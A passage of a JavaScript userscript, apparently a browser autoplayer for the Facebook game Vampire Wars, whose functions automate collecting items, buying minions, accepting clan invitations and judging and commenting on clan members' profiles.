////		var akemsResult = document.evaluate("//td[@class='lotto_flavor']",document,null,9,null).singleNodeValue;
//		var akemsResult = document.evaluate("//div[@class='itemInfo']",document,null,9,null).singleNodeValue;
//		if(akemsResult!=null && akemsResult.innerHTML.indexOf('The chest creaks open at your touch') != -1){
//			var akemsItemWon = akemsResult.innerHTML.split('Akem Manah smiles. ')[1].split('<br>')[0];	
//			var akemsItemAtt = akemsResult.innerHTML.split('icon-attack.gif"> ')[1].split(' Attack<br>')[0];	
//			var akemsItemDef = akemsResult.innerHTML.split('icon-defense.gif"> ')[1].split(' Defense<br>')[0];	
//			addToLog("Free Gamble Result: " +akemsItemWon+" ("+akemsItemAtt+"/"+akemsItemDef+")");
//		}
	}
}


function DoCollector(){
	//autoCollector logic
	log('Autoplayer autoCollector');

	var collectorDiv = xpathFirst('.//div[@id="v_collector"]', innerPageElt);

	if (!collectorDiv) {
		addToLog('Collector Error: Can\'t find Collector dialog div!');
		log('Autoplayer autoCollector Error: Can\'t find Collector dialog div!');
		return;
	}
		
	var collectorHireElt = xpathFirst('//input[@type="submit" and @value="Hire for Blood"]', collectorDiv);
	var collectorRehireElt = xpathFirst('//input[@type="submit" and @value="Rehire Collector"]', collectorDiv);
	var collectorRehireBribeElt = xpathFirst('//input[@type="submit" and @value="Bribe for 3 Favor Points"]', collectorDiv);
	var collectorBribeElt = xpathFirst('//input[@type="submit" and @value="Collect Early for 6 Favor Points"]', collectorDiv);
	var collectorTimerElt = xpathFirst('//span[@id="myFreakinTimer"]', collectorDiv);
	var collectorCollectGoodsElt = xpathFirst('//input[@type="submit" and @value="Collect my Goods"]', collectorDiv);
	var collectorWaitElt = xpathFirst('//div[@class="pop_buttons"]//span[@value="Wait"]', innerPageElt);


	//if (collectorTimerElt) alert('found collectorTimerElt');
	//if (collectorCollectGoodsElt) alert('found collectorCollectGoodsElt');

	// Collector States:
	// 1: Available for Hire
	// 2: Hired
	// 3: Ready to collect
	// 4: Available for re-hire (too late)
	// -1: State Unknown
	// -2: Energy Boost ready for collection, but player has too many to collect - must pause

	if(collectorWaitElt) {
		GM_setValue('collectorState', -2);
	} else if(collectorHireElt) {
		GM_setValue('collectorState', 1);
		addToLog('Collector is available for Hire');
	} else if (collectorCollectGoodsElt) {
		GM_setValue('collectorState', 3);
	} else if (collectorTimerElt) {
		GM_setValue('collectorState', 2);
	} else if (collectorRehireElt) {
		GM_setValue('collectorState', 4);
	} else {
		GM_setValue('collectorState', -1);
	}

	switch(GM_getValue('collectorState', -1)) {
		case -2:
			addToLog('Collector: Can\'t collect Energy Boost - You have too many of them!  Auto Collector paused.');
			//GM_setValue('autoCollector',0);
			GM_setValue('autoCollectorPause', 'checked')

			if (!collectorWaitElt) {
			    log('Can\'t find \'Wait\' button to click. ');
			    return true;
			}

			// Tell the Collector to Wait!
			Autoplay.fx = function() {
			    clickAction = 'collector_wait';
			    clickElement(collectorWaitElt);
			    log('Collector: Too many Energy Boosts to collect - telling him to wait');
			    addToLog('Collector: Too many Energy Boosts to collect - telling him to wait');
			};
			Autoplay.delay = delay;
			Autoplay.start();

			return;
			break;
		case -1:
			addToLog('Collector state UNKNOWN');
			if((GM_getValue('autoCollector', '') != "checked") || (GM_getValue('paused')!=0))
				return;
			break;
		case 1:
			addToLog('Collector is available for Hire');
			if((GM_getValue('autoCollector', '') != "checked") || (GM_getValue('paused')!=0))
				return;
			
			// First we need to select the right item
			var collectorItemSelectedElt = xpathFirst('//div[@class="collectOption collectOptionHighlight"]', collectorDiv);

//			var collectorItemToSelectElt = xpathFirst('//div[@id="harvest_'+collectorItems[parseInt(GM_getValue('selectCollector'))][1]+'"]', collectorDiv);
			var collectorItemToSelectElt = xpathFirst('//div[contains(@onclick,"selectBOEOption(\'") and contains(@onclick,"\',\''+collectorItems[parseInt(GM_getValue('selectCollector'))][2]+'\');")]', collectorDiv);

			if (!collectorItemToSelectElt) {
			    log('Can\'t find correct Collector Item to select. ');
			    return true;
			}


			var collectorItemToSelectBlood = collectorItemToSelectElt.getAttribute('title').split(' for ')[1];
			
			if (collectorItemToSelectElt == collectorItemSelectedElt) {
				// The desired Item is already selected - hire the Collector!
				if (!collectorHireElt) {
				    log('Can\'t find the link to Hire the Collector. ');
				    return true;
				}

				Autoplay.fx = function() {
				    clickAction = 'select_item_to_collect';
				    clickElement(collectorHireElt);
				    log('Hiring Collector');
				    addToLog('Hiring Collector to craft '+collectorItems[parseInt(GM_getValue('selectCollector'))][0]+' for '+collectorItemToSelectBlood+' blood');
				};
				Autoplay.delay = delay;
				Autoplay.start();

				
			} else {
				// We need to select the correct item
				clickElement(collectorItemToSelectElt);
				log('Selecting Collector Item: '+collectorItems[parseInt(GM_getValue('selectCollector'))][0]);
				addToLog('Selecting Collector Item: '+collectorItems[parseInt(GM_getValue('selectCollector'))][0]);

				// Hire the collector
				if (!collectorHireElt) {
				    log('Can\'t find the link to Hire the Collector. ');
				    return true;
				}

				Autoplay.fx = function() {
				    clickAction = 'select_item_to_collect';
				    clickElement(collectorHireElt);
				    log('Hiring Collector');
				    addToLog('Hiring Collector to craft '+collectorItems[parseInt(GM_getValue('selectCollector'))][0]+' for '+collectorItemToSelectBlood+' blood');
				};
				Autoplay.delay = Math.max(delay-200, 100);
				Autoplay.start();
			}
			
			break;
		case 2:
			addToLog('Collector is busy crafting - time to collect: '+collectorTimerElt.innerHTML);
			collectorDue = (collectorTimerElt.innerHTML.split(':')[0] * 3600) + (collectorTimerElt.innerHTML.split(':')[1].split(':')[0] * 60) + (collectorTimerElt.innerHTML.split(':')[2]*1);
			var now = Math.floor(new Date().getTime() / 1000);
			GM_setValue('CollectorDue',now + collectorDue);

			var collectorItemInProgressDiv = xpathFirst('//div[@class="collectOptionInProgress"]', collectorDiv);
			var collectorDialogDiv = xpathFirst('//div[@class="collectorDialogue"]', collectorDiv);
			if (collectorItemInProgressDiv && collectorDialogDiv && collectorDialogDiv.innerHTML.indexOf('Sorry, nothing yet')==-1) {
			    var collectorItemInProgress = collectorItemInProgressDiv.innerHTML.split('Collect 1 ')[1].split('<br>')[0];
			    log('Successfully Hired Collector to craft '+collectorItemInProgress);
			    addToLog('Successfully Hired Collector to craft '+collectorItemInProgress);
			}

//			if((GM_getValue('autoCollector', '') != "checked") || (GM_getValue('paused')!=0))
//				return;
			break;
		case 3:
			addToLog('Collector is ready to collect');
			if(GM_getValue('paused')!=0)
				return;

			if (!collectorCollectGoodsElt) {
			    log('Can\'t find \'Collect My Goods\' link to click. ');
			    return true;
			}

			
			//alert('selectCollector='+GM_getValue('selectCollector','')+'  tooManyNRGBoosts='+GM_getValue('tooManyNRGBoosts',false));
			
			if ((collectorItems[parseInt(GM_getValue('selectCollector'))][0] == "50% Energy Boost") && (GM_getValue('tooManyNRGBoosts',false))) {
				addToLog('Collector: Can\'t collect Energy Boost - You have too many of them!  Auto Collector paused.');
				//GM_setValue('autoCollector',0);
				GM_setValue('autoCollectorPause', 'checked')

				//if (!collectorWaitElt) {
				//    log('Can\'t find \'Wait\' button to click. ');
				//    return true;
				//}
				//
				//// Tell the Collector to Wait!
				//Autoplay.fx = function() {
				//    clickAction = 'collector_wait';
				//    clickElement(collectorWaitElt);
				//    log('Collector: Too many Energy Boosts to collect - telling him to wait');
				//    addToLog('Collector: Too many Energy Boosts to collect - telling him to wait');
				//};
				//Autoplay.delay = delay;
				//Autoplay.start();

				return;
			} else {
				// Collect the Goods!
				Autoplay.fx = function() {
				    clickAction = 'collect_goods';
				    clickElement(collectorCollectGoodsElt);
				    log('Collecting Goods');
				    addToLog('Collecting goods from the Collector');
				};
				Autoplay.delay = delay;
				Autoplay.start();
			}

			break;
		case 4:
			addToLog('Collector is available for Re-hire (too late)');
			if((GM_getValue('autoCollector', '') != "checked") || (GM_getValue('paused')!=0))
				return;



			if (GM_getValue('rCollectorRehire')=='checked') {

				if (!collectorRehireElt) {
				    log('Can\'t find Collector Rehire link to click. ');
				    return true;
				}

				// Rehire the Collector!
				Autoplay.fx = function() {
				    clickAction = 'rehire_collector';
				    clickElement(collectorRehireElt);
				    log('Rehiring Collector');
				    addToLog('Rehiring Collector');
				};
				Autoplay.delay = delay;
				Autoplay.start();
			} else if (GM_getValue('rCollectorBribe')=='checked')  {

				if (!collectorRehireBribeElt) {
				    log('Can\'t find Collector Rehire (Bribe) link to click. ');
				    return true;
				}

				// Rehire the Collector!
				Autoplay.fx = function() {
				    clickAction = 'rehire_bribe_collector';
				    clickElement(collectorRehireBribeElt);
				    log('Rehiring (Bribing) Collector');
				    addToLog('Rehiring (Bribing) Collector');
				};
				Autoplay.delay = delay;
				Autoplay.start();
			} else {
				log('Collector Error: Collector Rehire Instructions not set! Disabling Auto Collector');
				addToLog('Collector Error: Collector Rehire Instructions not set! Disabling Auto Collector');
				GM_setValue('autoCollector',0);
			}
	}
}


function DoRetreat(){
	// Elder's Retreat logic
	log('Autoplayer Elder\'s Retreat');

	if (GM_getValue('autoRetreat', '') != "checked")
		return;

	var retreatDiv = xpathFirst('.//div[@id="PropertiesCarousel"]', innerPageElt);

	if (!retreatDiv) {
		addToLog('Elder\'s Retreat Error: Can\'t find PropertiesCarousel div!');
		log('Autoplayer Elder\'s Retreat Error: Can\'t find PropertiesCarousel div!');
		return;
	}

	var property1Li = document.getElementById('property_1').parentNode;
	if (!property1Li) {
		addToLog('Elder\'s Retreat Error: Can\'t find Property 1 LI!');
		log('Autoplayer Elder\'s Retreat Error: Can\'t find Property 1 LI!');
		return;
	}

	var property1CollectButton = xpathFirst('.//div[@id="CollectButton_1"]', innerPageElt);
	if (property1CollectButton) {
		addToLog('Elder\'s Retreat: Ancient\'s Workshop ready to collect');
		log('Elder\'s Retreat: Ancient\'s Workshop ready to collect');

		var now = Math.floor(new Date().getTime() / 1000);
		GM_setValue('Retreat1Due',now + (24 * 3600));

		// Collect Property 1!
		Autoplay.fx = function() {
		    clickAction = 'collect_property_1';
		    clickElement(property1CollectButton);
		    log('Collecting from Ancient\'s Workshop');
		    addToLog('Collecting from Ancient\'s Workshop');
		};
		Autoplay.delay = delay;
		Autoplay.start();

		return;
	}

	var property1TimerElt = xpathFirst('.//div[@class="collectProgress"]//div[@class="collectTimer"]', property1Li);
	if (property1TimerElt) {
		var property1TimerDueText = property1TimerElt.innerHTML.split('"timer_1">')[1].split('</span>')[0];
		//alert('property1TimerDueText = '+property1TimerDueText);
		var property1TimerDue = (property1TimerDueText.split(':')[0] * 3600) + (property1TimerDueText.split(':')[1].split(':')[0] * 60) + (property1TimerDueText.split(':')[2]*1);
		//alert('property1TimerDue='+property1TimerDue);
		var now = Math.floor(new Date().getTime() / 1000);
		GM_setValue('Retreat1Due',now + property1TimerDue);
	} else {
		var now = Math.floor(new Date().getTime() / 1000);
		GM_setValue('Retreat1Due',now + (24 * 3600));
	}



	var property2Li = document.getElementById('property_2').parentNode;
	if (!property2Li) {
		addToLog('Elder\'s Retreat Error: Can\'t find Property 2 LI!');
		log('Autoplayer Elder\'s Retreat Error: Can\'t find Property 2 LI!');
		return;
	}

	var property2CollectButton = xpathFirst('.//div[@id="CollectButton_2"]', innerPageElt);
	var property2ConfirmButton = xpathFirst('.//div[@id="CollectConfirm_2"]//div[@onclick="hideCollectConfirmation_2(); doCollect_2();"]', innerPageElt);
	if (property2CollectButton && property2ConfirmButton) {
		addToLog('Elder\'s Retreat: Sagaan\'s Altar ready to collect');
		log('Elder\'s Retreat: Sagaan\'s Altar ready to collect');

		var now = Math.floor(new Date().getTime() / 1000);
		GM_setValue('Retreat2Due',now + (24 * 3600));

		clickElement(property2CollectButton);

		// Collect Property 2!
		Autoplay.fx = function() {
		    clickAction = 'collect_property_2';
		    clickElement(property2ConfirmButton);
		    log('Collecting from Sagaan\'s Altar');
		    addToLog('Collecting from Sagaan\'s Altar');
		};
		Autoplay.delay = delay;
		Autoplay.start();

		return;
	}

	var property2TimerElt = xpathFirst('.//div[@class="collectProgress"]//div[@class="collectTimer"]', property2Li);
	if (property2TimerElt) {
		var property2TimerDueText = property2TimerElt.innerHTML.split('"timer_2">')[1].split('</span>')[0];
		//alert('property2TimerDueText = '+property2TimerDueText);
		var property2TimerDue = (property2TimerDueText.split(':')[0] * 3600) + (property2TimerDueText.split(':')[1].split(':')[0] * 60) + (property2TimerDueText.split(':')[2]*1);
		//alert('property2TimerDue='+property2TimerDue);
		var now = Math.floor(new Date().getTime() / 1000);
		GM_setValue('Retreat2Due',now + property2TimerDue);
	} else {
		var now = Math.floor(new Date().getTime() / 1000);
		GM_setValue('Retreat2Due',now + (24 * 3600));
	}


	
	return;
}

function DoClanAccepts(){
// Grab and save my current number of clan and Skill Rating
	// While we're here on the Clan page we might as well grab the clan size and store it.
	clan =  parseInt(document.body.innerHTML.split('My Clan (')[1]);
	GM_setValue('myClan',clan);

	if(GM_getValue('autoClan', '') != "checked" || GM_getValue('paused')!=0 )
		return;
	if(document.body.innerHTML.indexOf("The following people have requested that you join their Clan")!=-1){
		var useridlink = document.getElementById('v_recruit').getElementsByTagName('a')[1];
		var id = parseInt(useridlink.href.split('recruit.php?action=accept&user_id=')[1]);
		if (isNaN(id)) 
			window.location = "http://apps.facebook.com/"+SCRIPT.name+ GM_getValue('refreshPage', "/index.php");
		else{
			log('DoClanAccepts id='+id);
			addToLog("Accepting invitation of "+ id );
			window.location = "http://apps.facebook.com/"+SCRIPT.name+"/recruit.php?action=accept&user_id="+ id;
		}
	}
}

// Auto-purchase minions - AJAX (by Zorkfour)
function UpdateMinionPage(){
	log('UpdateMinionPage');
	var minions = document.evaluate("//tr[@class='darkRow'] | //tr[@class='lightRow']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
	var minReturn = 9999999;

	// Iterate minions to determine best return on investment
	for (var index = 0 ; index < minions.snapshotLength; index++){
		var hasForm = minions.snapshotItem(index).getElementsByTagName('td')[3].getElementsByTagName('form');
		// Ensure minion is purchasable
		if(hasForm.length>0){
//			var minionIncome = parseInt(minions.snapshotItem(index).getElementsByTagName('td')[1].getElementsByTagName('span')[0].innerHTML.split('blood.gif">')[1].split(',').join(''),10);
			var minionIncome = parseInt(minions.snapshotItem(index).getElementsByTagName('td')[1].getElementsByTagName('span')[0].innerHTML.split('>')[1].split(',').join(''),10);
//			var minionCost = parseInt(minions.snapshotItem(index).getElementsByTagName('td')[2].getElementsByTagName('span')[0].innerHTML.split('blood.gif">')[1].split(',').join(''),10);
			var minionCost = parseInt(minions.snapshotItem(index).getElementsByTagName('td')[2].getElementsByTagName('span')[0].innerHTML.split('>')[1].split(',').join(''),10);
			
			if (minionCost / minionIncome < minReturn)
				minReturn = minionCost / minionIncome;
		}
	}
	
	// Iterate minions to display cost per blood and purchase if able
	for (var index = minions.snapshotLength-1; index >=0 ; index--)
	{
		var hasForm = minions.snapshotItem(index).getElementsByTagName('td')[3].getElementsByTagName('form');
		// Ensure minion is purchasable
		if(hasForm.length>0){
//			var minionIncome = parseInt(minions.snapshotItem(index).getElementsByTagName('td')[1].getElementsByTagName('span')[0].innerHTML.split('blood.gif">')[1].split(',').join(''),10);
			var minionIncome = parseInt(minions.snapshotItem(index).getElementsByTagName('td')[1].getElementsByTagName('span')[0].innerHTML.split('>')[1].split(',').join(''),10);
//			var minionCost = parseInt(minions.snapshotItem(index).getElementsByTagName('td')[2].getElementsByTagName('span')[0].innerHTML.split('blood.gif">')[1].split(',').join(''),10);
			var minionCost = parseInt(minions.snapshotItem(index).getElementsByTagName('td')[2].getElementsByTagName('span')[0].innerHTML.split('>')[1].split(',').join(''),10);
			var divSpot = minions.snapshotItem(index).getElementsByTagName('td')[1];
			var divbox = document.createElement('div');
			if (minionCost / minionIncome == minReturn){
				GM_setValue('minionCostk', parseInt(minionCost/1000));
				divbox.innerHTML = 'Cost per blood: <strong class="good"><img src="http://facebook.vampires.static.zynga.com/graphics/icon-blood.gif"/>' + (minionCost / minionIncome).toFixed(2) + '</strong>';
				// Auto-purchase minion
				
				if(GM_getValue('spendBank', '') == "checked"){
					var totalblood = blood + bankvalue -  GM_getValue('spendBankKeep', 0);
				} else {
					var totalblood = blood;
				}
				
				if(GM_getValue('autoMinion', '') == "checked" && totalblood > minionCost*10 && (GM_getValue('paused')==0)){
					var minionForm = minions.snapshotItem(index).getElementsByTagName('td')[3].getElementsByTagName('form')[0];
					minionForm.getElementsByTagName('select')[0].value =10;
//					setTimeout(function(){minionForm.submit();},delay);
//					setTimeout(function(){minionForm.getElementsByTagName('input')[2].click();},delay);
					setTimeout(function(){getElementsByAttribute(minionForm,"input", "type", "submit")[0].click();},delay);
					return;
				}
			}
			else
				divbox.innerHTML = 'Cost per blood: <strong class="money"><img src="http://facebook.vampires.static.zynga.com/graphics/icon-blood.gif"/>' + (minionCost / minionIncome).toFixed(2) + '</strong>';
			divSpot.appendChild(divbox);
		}
	}	
}

// Auto-purchase minions - no AJAX  (Zorkfour)
//if (location.href.indexOf(SCRIPT.name+'/properties') != -1 && (GM_getValue('paused')==1)){
//	if(blood==undefined){
//		RefreshGlobalStats();
//	}
//	UpdateMinionPage();
//}



// Display Job Exp Rate Gain on Missions Page
function UpdateJobsPage(){
	log('UpdateJobsPage');
	var jobs = document.evaluate("//tr[@class='darkRow'] | //tr[@class='lightRow'] | //tr[@class=''] | //tr[@class='aJob']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
	var maxReturn = 0;
//	alert('# jobs='+jobs.snapshotLength);

	// Iterate jobs to determine best return on investment
	for (var index = 0 ; index < jobs.snapshotLength; index++){
		var jobIncome = parseInt(jobs.snapshotItem(index).getElementsByTagName('td')[2].title.split(' Energy').join(''),10);
//		alert('jobIncome='+jobIncome);
//		var jobCost = parseInt(jobs.snapshotItem(index).getElementsByTagName('td')[1].innerHTML.split('Exp:&nbsp;+')[1].split('	').join(''),10);
		var jobCost = parseInt(jobs.snapshotItem(index).getElementsByTagName('td')[1].innerHTML.split('Exp')[1].split('+')[1].split('	').join(''),10);

		if (jobCost / jobIncome > maxReturn)
			maxReturn = jobCost / jobIncome;
	}
	
	// Iterate jobs to display Exp gained per Energy spent
	for (var index = jobs.snapshotLength-1; index >=0 ; index--)
	{
		var jobIncome = parseInt(jobs.snapshotItem(index).getElementsByTagName('td')[2].title.split(' Energy').join(''),10);
//		var jobCost = parseInt(jobs.snapshotItem(index).getElementsByTagName('td')[1].innerHTML.split('Exp:&nbsp;+')[1].split('	').join(''),10);
		var jobCost = parseInt(jobs.snapshotItem(index).getElementsByTagName('td')[1].innerHTML.split('Exp')[1].split('+')[1].split('	').join(''),10);
		if (jobCost / jobIncome == maxReturn){
			GM_setValue('jobCost', jobCost);
			jobGainText = '<span style="font-size: 10px;">&nbsp;&nbsp;(Pays <strong class="good"><img src="http://facebook.vampires.static.zynga.com/graphics/icon-energy.gif"/>' + (jobCost / jobIncome).toFixed(2) + 'x</strong>)</span>';
		}
		else
			jobGainText = '<span style="font-size: 10px;">&nbsp;&nbsp;(Pays <strong class="money" font-size: 11px><img src="http://facebook.vampires.static.zynga.com/graphics/icon-energy.gif"/>' + (jobCost / jobIncome).toFixed(2) + 'x</strong>)</span>';
		if (jobs.snapshotItem(index).getElementsByTagName('td')[1].innerHTML.indexOf('Rumored ') != -1)
			jobs.snapshotItem(index).getElementsByTagName('td')[1].innerHTML = jobs.snapshotItem(index).getElementsByTagName('td')[1].innerHTML.replace('	<br',jobGainText + '	<br');
		else
			jobs.snapshotItem(index).getElementsByTagName('td')[1].innerHTML = jobs.snapshotItem(index).getElementsByTagName('td')[1].innerHTML + jobGainText;
	}	
}


function UpdatePlayerPage(){
	log('UpdatePlayerPage');
	var playerPageIsClan = false;
	var playerPageIsClanFavored = false;
	var userProfileActions = document.evaluate("//span[@class='profile_actions']",document,null,9,null).singleNodeValue;
	try{
		var playerPageUserID = userProfileActions.innerHTML.split('opponent_id=')[1].split('&amp;action=attack')[0];
		var lastProfileActionNode = userProfileActions.getElementsByTagName('a')[2].parentNode;
		log('UpdatePlayerPage - Detected opponent stats page (user ID = '+playerPageUserID+')');
	}
	catch(e){
		var playerPageUserID = userProfileActions.innerHTML.split('user=')[1].split('"')[0];
		var lastProfileActionNode = userProfileActions.getElementsByTagName('img')[0].parentNode.parentNode.parentNode;
		log('UpdatePlayerPage - Detected clan member stats page (user ID = '+playerPageUserID+')');
		playerPageIsClan = true;
	}
	lastProfileActionNode.appendChild(document.createTextNode(' | '));
	makeElement('a', lastProfileActionNode, {'href':'http://www.facebook.com/profile.php?id='+playerPageUserID})
	    .appendChild(document.createTextNode('FB Profile'));
	lastProfileActionNode.appendChild(document.createTextNode(' | '));
	var newImg = document.createElement("img");
	newImg.setAttribute("src", giftbox);
	newImg.setAttribute("style", "cursor: pointer;");
	newImg.addEventListener('click',giftPlayer(playerPageUserID), false);
	lastProfileActionNode.appendChild(newImg);

	var playerPageProfileTitleElt = document.evaluate("//div[@id='profile_title']",document,null,9,null).singleNodeValue;
	
	if (GM_getValue('clanList', '').indexOf(playerPageUserID) != -1) {
		log('UpdatePlayerPage - Detected Favored Clan member');
		playerPageIsClanFavored = true;
		makeElement('span', playerPageProfileTitleElt, {'style':'color:#58FA58; font-weight: 600'})
		    .appendChild(document.createTextNode('Favored Clan'));
	}

	var playerPageUserName = document.evaluate("//div[@id='profile_title']//span[@class='name']",document,null,9,null).singleNodeValue.innerHTML.split('<span title="')[1].split('">')[0];

	if (GM_getValue('paused')==0 && /*playerPageIsClan &&*/ playerPageIsClanFavored && GM_getValue('clanJudgeFC','checked') == 'checked') {
		log('UpdatePlayerPage - Checking judge status of favored clan member');
		var profileVoteNode = document.evaluate("//div[@id='profile_vote']",document,null,9,null).singleNodeValue;
		if (profileVoteNode) {
			log('UpdatePlayerPage - Found Vote Node');

			//var judgeToxicFormElt = xpathFirst('.//form[@id="voteStatsForm1"]', profileVoteNode);
			//var judgeToxicsubmitElt = xpathFirst('.//input[@type="submit"]', judgeToxicFormElt);
			//var judgeTemptingFormElt = xpathFirst('.//form[@id="voteStatsForm2"]', profileVoteNode);
			//var judgeTemptingsubmitElt = xpathFirst('.//input[@type="submit"]', judgeTemptingFormElt);
			//var judgeTastyFormElt = xpathFirst('.//form[@id="voteStatsForm3"]', profileVoteNode);
			//var judgeTastysubmitElt = xpathFirst('.//input[@type="submit"]', judgeTastyFormElt);

			var judgeFormElt = xpathFirst('//form[@id="voteStatsForm'+ (3-GM_getValue("clanJudgeRating", 1))+'"]', profileVoteNode);
			var judgeSubmitElt = xpathFirst('//input[@type="image"]', judgeFormElt);

			if (judgeSubmitElt) {
				log('UpdatePlayerPage - Judging Favored Clan Member (ID='+playerPageUserID+' Name='+playerPageUserName+') '+ratings[parseInt(GM_getValue('clanJudgeRating'))]);
				addToLog('Judging Favored Clan Member <a href="http://apps.facebook.com/vampiresgame/stats.php?user='+playerPageUserID+'">'+playerPageUserName+'</a> '+ratings[parseInt(GM_getValue('clanJudgeRating'))]);

				var clanJudgedItem = new Array(playerPageUserID,Math.floor(new Date().getTime() / 1000),0);

				var clanJudgedListSaved = GM_getValue('clanJudgedList', '').split(',');
				var clanIndex = clanJudgedListSaved.indexOf(playerPageUserID);
				if (clanIndex != -1) 
					clanJudgedListSaved.splice(clanIndex,3); // First remove the old entry
				clanJudgedListSaved.push(clanJudgedItem);

				if (clanJudgedArrayMaxSize > 0) {
					while (clanJudgedArrayMaxSize*3 < clanJudgedListSaved.length) {
						var itm = clanJudgedListSaved.shift();
					}
				}

				GM_setValue('clanJudgedList', clanJudgedListSaved.join(','));

				// Judge the player
				Autoplay.fx = function() {
				    clickAction = 'judge_favored_clan_member';
				    clickElement(judgeSubmitElt);
				    log('Judging Favored Clan Member (ID='+playerPageUserID+' Name='+playerPageUserName+') '+ratings[parseInt(GM_getValue('clanJudgeRating'))]);
				};
				Autoplay.delay = delay;
				Autoplay.start();

			}
		} else {
			log('UpdatePlayerPage - No Vote Node found');
			// Is there a judge history for this player?
			var clanJudgedListSaved = GM_getValue('clanJudgedList', '').split(',');
			var clanIndex = clanJudgedListSaved.indexOf(playerPageUserID);
			if (clanIndex == -1) {
				log('UpdatePlayerPage - No judge history found - adding a dummy history');
				var clanJudgedItem = new Array(playerPageUserID,Math.floor(new Date().getTime() / 1000),0);
				clanJudgedListSaved.push(clanJudgedItem);

				if (clanJudgedArrayMaxSize > 0) {
					while (clanJudgedArrayMaxSize*3 < clanJudgedListSaved.length) {
						var itm = clanJudgedListSaved.shift();
					}
				}

				GM_setValue('clanJudgedList', clanJudgedListSaved.join(','));
				
			} else {
				if (GM_getValue('clanJudgeCommentOn','checked') == 'checked') {

					log('UpdatePlayerPage - Going to comments page');
					var profileCommentLink = document.evaluate("//div[@class='subtabnav']//a[contains(@href,'/comments.php?user=')]",document,null,9,null).singleNodeValue;

					if (profileCommentLink) {
						log('UpdatePlayerPage - Found Comment Link');
						// Go to comment page
						Autoplay.fx = function() {
						    clickAction = 'go_to_comment_page';
						    clickElement(profileCommentLink);
						    log('Going to Favored Clan Members Comment Page');
						};
						Autoplay.delay = delay;
						Autoplay.start();

					}
				}
			}
		}
	}
}


function UpdatePlayerCommentPage(){
	log('UpdatePlayerCommentPage');
	var playerPageIsClanFavored = false;

	if (GM_getValue('paused')==0 && GM_getValue('clanJudgeFC','checked') == 'checked' && GM_getValue('clanJudgeCommentOn','checked') == 'checked') {
		var userProfileCommentsDiv = document.evaluate("//div[@id='v_comments']",document,null,9,null).singleNodeValue;
		if (userProfileCommentsDiv) {
			log('UpdatePlayerCommentPage - Found Comments Div');
			var playerPageUserID = document.evaluate("//div[@id='v_comments']//input[@name='user']",document,null,9,null).singleNodeValue.value;
			log('UpdatePlayerCommentPage - playerPageUserID = '+playerPageUserID);

			if (GM_getValue('clanList', '') != -1) {
				log('UpdatePlayerCommentPage - Detected Favored Clan member');
				playerPageIsClanFavored = true;

				var clanJudgedListSaved = GM_getValue('clanJudgedList', '').split(',');
				var clanIndex = clanJudgedListSaved.indexOf(playerPageUserID);

				if (clanIndex != -1) {
					// This clan member has been judged before - find out the last time
					var FCuserIDJudgeLastTime = clanJudgedListSaved[clanIndex+1]*1000;
					// alert('playerPageUserID '+playerPageUserID+' was last judged @ '+ new Date(clanJudgedListSaved[clanIndex+1]).format("HH:MM:ss")+' on '+ new Date(clanJudgedListSaved[clanIndex+1]).format("yyyy-mm-dd"));
					var FCuserIDCommentLastTime = clanJudgedListSaved[clanIndex+2]*1000;
					// alert('playerPageUserID '+playerPageUserID+' was last commented @ '+ new Date(clanJudgedListSaved[clanIndex+2]).format("HH:MM:ss")+' on '+ new Date(clanJudgedListSaved[clanIndex+2]).format("yyyy-mm-dd"));
					if ((FCuserIDJudgeLastTime >= (new Date().getTime() - (10*60*1000))) && (FCuserIDJudgeLastTime <= new Date().getTime()) && (FCuserIDCommentLastTime <= (new Date().getTime() - (2*60*60*1000)))) {
						// alert('Comment needs to be left for playerPageUserID '+playerPageUserID);

						var clanJudgeCommentTextArea = document.evaluate("//div[@id='v_comments']//textarea[@id='comment_textarea']",document,null,9,null).singleNodeValue; 
						var clanJudgeCommentSubmitElt = document.evaluate("//div[@id='v_comments']//input[@id='comment_submit']",document,null,9,null).singleNodeValue; 

						if (clanJudgeCommentTextArea && clanJudgeCommentSubmitElt) {
							clanJudgeCommentTextArea.innerHTML = GM_getValue('clanJudgeComment', "");
							setTimeout(function(){clanJudgeCommentSubmitElt.click();},delay);


							clanJudgedListSaved[clanIndex+2] = Math.floor(new Date().getTime() / 1000)
							GM_setValue('clanJudgedList', clanJudgedListSaved.join(','));
						}
					}
				}
			}
		}
	}
}












function UpdateGroupWall(){
	log('UpdateGroupWall');
	var users = document.evaluate("//td[@class='collapseCell']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
	for (var index = 0 ; index < users.snapshotLength ; index++)
	{
		var img = users.snapshotItem(index).getElementsByTagName('img')[0];
		if(img!=null)
			img.addEventListener('click',statsPlayer(img.getAttribute('uid')), false);
	}
}

// loadHome function - borrowed from MWAP
function loadHome() {
  document.location = 'http://apps.facebook.com/vampiresgame/index.php';
}







// loadHome function - borrowed from MWAP
function debugDumpSettings() {
  // Use showIfUnchecked() to show 0 value as "un-checked", or showIfSelected()
  // to show 0 value as "not selected" (for radio buttons).

//  var getJobList = function(listName){
//    var multiple_jobs_list = getSavedList(listName);
//    var jobNames = [];
//    for (var i=0, numJobs=multiple_jobs_list.length; i < numJobs; ++i) {
//      jobNames.push(missions[multiple_jobs_list[i]][0]);
//    }
//    return jobNames.join(', ');
//  };

//  var ratioJobs = getJobList('selectMissionMultiple');
//  var selectTier = 'None';
//  if (GM_getValue('selectTier') != '0.0') {
//    selectedTierValue = GM_getValue('selectTier').split('.');
//    selectTier = cities[parseInt(selectedTierValue[0])][0] + ' - ' + missionTabs[NY][parseInt(selectedTierValue[1]) - 1];
//  }

//  if (GM_getValue('language') != 'en') {
//    log('Language is "' + GM_getValue('language') + '".');
//    addToLog('warning Icon', 'Unfortunately, only the English version of the game is fully supported. If you experience problems, set your Facebook language to English and try again.');
//  }


  if (GM_getValue('rBoxLeft')=='checked') var BoxToOpenText="Left";
  if (GM_getValue('rBoxMiddle')=='checked') var BoxToOpenText="Middle";
  if (GM_getValue('rBoxRight')=='checked') var BoxToOpenText="Right";

  if (GM_getValue('rCollectorRehire')=='checked') var CollectorActionTooLate="Rehire";
  if (GM_getValue('rCollectorBribe')=='checked') var CollectorActionTooLate="Bribe";


  addToLog('>  >  >  >  >  BEGIN SETTINGS DUMP  <  <  <  <  <<br>' +
        'Script Version: <strong>' + SCRIPT.version + '</strong><br>' +
        'VW Game Version: <strong>' + gameVersion + '</strong><br>' +
        'Player current level: <strong>' + level + '</strong><br>' +
